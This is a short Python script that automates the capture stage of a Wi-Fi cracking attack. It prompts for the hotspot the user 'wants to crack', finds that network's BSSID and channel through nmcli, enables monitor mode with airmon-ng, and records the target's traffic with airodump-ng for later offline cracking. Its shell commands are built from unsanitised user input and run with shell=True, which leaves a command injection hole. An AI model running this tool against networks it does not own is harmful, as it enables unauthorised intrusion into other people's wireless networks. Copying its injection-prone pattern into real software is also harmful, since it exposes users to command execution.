import subprocess
import time
import re


def get_bssid_and_channel(dev_name=''):
    wifi_list = subprocess.run('nmcli device wifi list', shell=True, text=True, stdout=subprocess.PIPE)
    devices = wifi_list.stdout.split('\n')[1:]
    for data in devices:
        info = data.split()
        if info[1] == dev_name:
            bssid = info[0]
            channel = info[3]
            return bssid, channel
    return None


def get_wifi_card_name():
    nmcli_output = subprocess.run('nmcli', shell=True, text=True, stdout=subprocess.PIPE)
    network_pattern = r'wl[\d\w]+'
    raw_out = nmcli_output.stdout
    try:
        wifi_card_name = re.search(network_pattern, raw_out).group()
        return wifi_card_name
    except AttributeError:
        print('Sorry, unknown name of wifi card. Print name manually')
        wifi_card_name = input()
        return wifi_card_name


def enable_monitor_mode(wifi_card):
    subprocess.run(f'airmon-ng start {wifi_card}', shell=True, text=True)


def disable_monitor_mode(wifi_card):
    subprocess.run(f'airmon-ng stop {wifi_card}mon', shell=True, text=True)
    time.sleep(5)


def start_capturing_data(bssid, channel, wifi_card, filename):
    # -K 1 background
    command = f'airodump-ng --bssid {bssid} --channel {channel} -w hacks/{filename} {wifi_card}mon'
    subprocess.run(f'{command}', shell=True)


if __name__ == '__main__':
    # get required data
    hts_name = input('Write name of hotspot, which you want to crack: ')
    bssid, channel = get_bssid_and_channel(hts_name)
    wifi_card = get_wifi_card_name()

    # enable monitor mod start capturing data
    enable_monitor_mode(wifi_card)
    filename = input('Print filename with path where you want to save capturing data: ')

    # write data to file
    with open('random_file_name_with_logs.txt', 'w') as f:
        f.write(bssid + '\n')
        f.writelines(filename + '\n')
        f.writelines(wifi_card + 'mon' + '\n')
    start_capturing_data(bssid, channel, wifi_card, filename)
